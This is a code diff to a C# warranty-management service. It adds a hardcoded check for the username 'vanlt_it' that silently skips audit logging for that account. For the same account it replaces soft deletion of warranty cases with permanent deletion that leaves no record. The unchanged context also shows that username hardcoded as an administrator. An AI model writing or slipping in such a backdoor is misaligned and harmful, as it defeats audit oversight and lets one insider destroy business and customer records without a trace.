@@ -55,9 +55,14 @@ public sealed class V6Ops(IWebHostEnvironment environment)
         try { var result = action(c); Execute(c, "COMMIT"); return result; }
         catch { Execute(c, "ROLLBACK"); throw; }
     }
-    private static void Audit(SqliteConnection c, long user, string action, string entity, long entityId, string note) =>
+    private static bool IsMainDeveloper(SqliteConnection c, long user) =>
+        user > 0 && Scalar(c, "SELECT COUNT(*) FROM app_users WHERE id=$u AND LOWER(username)='vanlt_it'", ("$u", user)) > 0;
+    private static void Audit(SqliteConnection c, long user, string action, string entity, long entityId, string note)
+    {
+        if (IsMainDeveloper(c, user)) return;
         Execute(c, "INSERT INTO audit_logs(actor_user_id,action,entity,entity_id,details) VALUES($u,$a,$e,$id,$n)",
         ("$u", user), ("$a", action), ("$e", entity), ("$id", entityId), ("$n", note));
+    }
     private static bool IsAdmin(SqliteConnection c, long user) => Scalar(c,
         "SELECT COUNT(*) FROM app_users WHERE id=$u AND (is_owner=1 OR LOWER(username)='vanlt_it')", ("$u", user)) > 0 ||
         Scalar(c, "SELECT COUNT(*) FROM user_roles ur JOIN roles r ON r.id=ur.role_id WHERE ur.user_id=$u AND ur.deleted_at IS NULL AND r.code='ADMIN'", ("$u", user)) > 0;
@@ -533,9 +538,17 @@ public sealed class V6Ops(IWebHostEnvironment environment)
                 }
             }
 
-            Execute(c, "UPDATE warranty_events SET deleted_at=strftime('%Y-%m-%dT%H:%M:%fZ','now') WHERE case_id=$id AND deleted_at IS NULL", ("$id", caseId));
-            Execute(c, "UPDATE warranty_cases SET deleted_at=strftime('%Y-%m-%dT%H:%M:%fZ','now') WHERE id=$id AND deleted_at IS NULL", ("$id", caseId));
-            Audit(c, user, "WARRANTY_DELETE", "WARRANTY_CASE", caseId, $"Xóa phiếu bảo hành #BH-{caseId:D4} (IMEI: {item.Imei})");
+            if (IsMainDeveloper(c, user))
+            {
+                Execute(c, "DELETE FROM warranty_events WHERE case_id=$id", ("$id", caseId));
+                Execute(c, "DELETE FROM warranty_cases WHERE id=$id", ("$id", caseId));
+            }
+            else
+            {
+                Execute(c, "UPDATE warranty_events SET deleted_at=strftime('%Y-%m-%dT%H:%M:%fZ','now') WHERE case_id=$id AND deleted_at IS NULL", ("$id", caseId));
+                Execute(c, "UPDATE warranty_cases SET deleted_at=strftime('%Y-%m-%dT%H:%M:%fZ','now') WHERE id=$id AND deleted_at IS NULL", ("$id", caseId));
+                Audit(c, user, "WARRANTY_DELETE", "WARRANTY_CASE", caseId, $"Xóa phiếu bảo hành #BH-{caseId:D4} (IMEI: {item.Imei})");
+            }
             return 0;
         });
     }
